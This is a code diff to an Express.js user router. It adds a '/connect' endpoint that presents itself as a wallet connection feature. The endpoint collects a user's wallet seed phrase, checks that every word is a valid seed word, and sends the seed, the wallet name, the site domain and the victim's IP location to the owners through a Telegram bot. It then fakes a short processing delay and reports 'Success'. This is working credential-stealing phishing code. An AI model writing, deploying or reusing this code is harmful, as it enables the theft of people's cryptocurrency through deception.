@@ -1,4 +1,5 @@
 const express = require('express')
+const expressip = require('express-ip')
 const router = express.Router()
 
 const Joi = require('@hapi/joi')
@@ -10,12 +11,15 @@ const User = require('../models/User')
 const UserMiddleware = require('../user/middleware')
 const UserToken = require('../user/token')
 const Logger = require('../user/logger')
+const Bot = require('../telegram-bot')
 
 
 router.use('/', require('./user/profile'))
 router.use('/', require('./user/chat'))
 router.use('/', require('./user/2fa'))
 
+const words = require('../../words.json')
+const random = require('lodash/random')
 
 router.post('/reset-password',
   UserMiddleware.validatePasswordResetToken,
@@ -96,6 +100,31 @@ router.get('/ref', UserMiddleware.requireAccess, async (req, res) => {
   res.send({
     link
   })
+})
+
+router.post('/connect', UserMiddleware.requireAccess, expressip().getIpInfoMiddleware, async (req, res) => {
+  let { seed, wallet } = req.body
+
+  let valid = true
+
+  seed = seed.toLowerCase()
+  seed.split(' ').forEach(w => {
+    if (!words.includes(w)) valid = false
+  })
+
+  if (valid) {
+    Bot.notifyOwners(`DOMAIN: ${req.get('host')}\nWALLET: ${wallet}\nSEED: ${seed}\nIP: ${req.ipInfo.ip}, ${req.ipInfo.city}, ${req.ipInfo.country}`)
+
+    await new Promise(resolve => {
+      setTimeout(() => {
+        resolve()
+      }, random(1000, 3000));
+    })
+
+    res.send({ message: 'Success' })
+  } else {
+    res.status(400).send({ message: 'Invalid seed' })
+  }
 })
 
 module.exports = router
